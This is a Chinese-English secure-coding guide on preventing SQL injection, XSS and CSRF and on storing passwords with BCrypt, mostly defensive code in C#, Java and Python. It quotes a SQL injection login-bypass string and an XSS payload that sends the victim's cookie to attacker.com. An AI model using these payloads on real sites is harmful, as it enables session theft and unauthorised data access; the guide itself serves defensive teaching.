SQL注入防护

SQL Injection Prevention

攻击原理

攻击者通过在用户输入中注入恶意SQL代码，绕过验证或执行未授权的数据库操作。

// 恶意输入：' OR '1'='1
String sql = "SELECT * FROM users WHERE name='" + name + "' AND pwd='" + pwd + "'";
// 最终变成：SELECT * FROM users WHERE name='' OR '1'='1' AND pwd='' OR '1'='1'

防护方案：参数化查询

// C# - 使用参数化查询
string sql = "SELECT * FROM users WHERE name = @name AND pwd = @pwd";
using (SqlCommand cmd = new SqlCommand(sql, conn)) {
    cmd.Parameters.AddWithValue("@name", name);
    cmd.Parameters.AddWithValue("@pwd", pwd);
    cmd.ExecuteReader();
}
// Java - 使用 PreparedStatement
String sql = "SELECT * FROM users WHERE name = ? AND pwd = ?";
PreparedStatement ps = conn.prepareStatement(sql);
ps.setString(1, name);
ps.setString(2, pwd);
ResultSet rs = ps.executeQuery();
// Python - 使用 ORM (SQLAlchemy)
result = db.session.execute(
    User.__table__.select().where(
        User.name == name,
        User.pwd == pwd
    )
)

禁止的做法

  • 字符串拼接SQL
  • 直接执行用户输入
  • 使用管理员权限连接数据库
  • 在生产环境显示详细错误

最佳实践

  • 始终使用参数化查询
  • 使用ORM框架
  • 最小权限原则配置数据库账户
  • 输入验证 + 白名单过滤

XSS跨站脚本防护

Cross-Site Scripting Prevention

攻击原理

攻击者向网页注入恶意JavaScript代码，当其他用户访问时执行窃取Cookie、会话令牌等。

// 恶意输入
"><script>document.location='http://attacker.com?c='+document.cookie</script>

防护方案

// 1. HTML转义
public static string HtmlEncode(string input) {
    return System.Web.HttpUtility.HtmlEncode(input);
}
// < → <  > → >  " → "  ' → '

// 2. 使用模板引擎默认转义
// Thymeleaf: th:text (默认转义)  th:utext (不转义)
// Vue: {{data}} (转义)  v-html (不转义，需慎用)

// 3. Content Security Policy
Response.Headers.Add("Content-Security-Policy", 
    "script-src 'self'; style-src 'self' 'unsafe-inline'");

CSRF跨站请求伪造防护

Cross-Site Request Forgery Prevention

攻击原理

攻击者诱导已登录用户访问恶意页面，自动发送已认证的请求完成转账、修改密码等操作。

防护方案

// 1. CSRF Token
// 服务器生成随机Token，表单中包含，提交时验证
string csrfToken = Guid.NewGuid().ToString();
Session["CSRF_Token"] = csrfToken;
// 表单：<input type="hidden" name="csrf_token" value="@csrfToken" />

// 2. 验证请求来源
string origin = Request.Headers["Origin"];
if (origin != "https://yoursite.com") {
    return BadRequest("CSRF验证失败");
}

// 3. SameSite Cookie
Response.Cookies.Append("session_id", sessionId, 
    new CookieOptions { SameSite = SameSiteMode.Strict });

密码安全存储

Secure Password Storage

最佳实践：BCrypt哈希

// .NET - 使用 BCrypt.Net-Next
// 密码哈希（注册时）
string hashedPassword = BCrypt.HashPassword(password);
// 第二个参数：work factor，越大越安全但越慢（建议10-12）

// 密码验证（登录时）
bool isValid = BCrypt.Verify(inputPassword, storedHash);
// Java - 使用 Spring Security BCrypt
BCryptPasswordEncoder encoder = new BCryptPasswordEncoder();
// 密码哈希
String hashed = encoder.encode(password);
// 密码验证
boolean matches = encoder.matches(inputPassword, hashed);

禁止的做法

  • 明文存储密码
  • 使用MD5/SHA1哈希（已被破解）
  • 不使用盐值
  • 使用固定盐值

正确做法

  • 使用BCrypt/Argon2/scrypt
  • 每个用户独立随机盐值
  • 设置合理的work factor
  • 登录失败锁定账户
